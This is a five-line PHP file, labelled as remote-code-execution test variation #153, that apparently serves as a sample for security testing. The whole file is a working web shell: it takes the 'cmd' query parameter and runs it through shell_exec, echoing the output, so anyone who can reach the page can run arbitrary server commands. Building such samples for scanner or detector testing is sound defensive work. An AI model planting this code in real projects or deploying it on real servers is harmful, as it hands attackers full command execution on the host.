<?php
// RCE test variation #153
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>